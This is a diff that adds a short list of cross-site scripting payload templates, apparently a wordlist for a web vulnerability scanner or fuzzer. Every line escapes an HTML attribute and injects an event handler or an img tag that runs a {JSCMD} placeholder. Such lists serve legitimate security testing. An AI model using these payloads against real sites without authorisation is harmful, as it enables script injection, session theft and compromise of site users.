@@ -1,0 +1,12 @@
+" autofocus onfocus={JSCMD} x="
+' autofocus onfocus={JSCMD} x='
+" onmouseover={JSCMD} x="
+' onmouseover={JSCMD} x='
+" onerror={JSCMD} x="
+' onerror={JSCMD} x='
+"><img src=x onerror={JSCMD}>
+'"><img src=x onerror={JSCMD}>
+" accesskey="x" onclick="{JSCMD}" x="
+' accesskey='x' onclick='{JSCMD}' x='
+" onanimationstart={JSCMD} style="animation-name:spin;animation-duration:1ms"
+' onanimationstart={JSCMD} style='animation-name:spin;animation-duration:1ms'
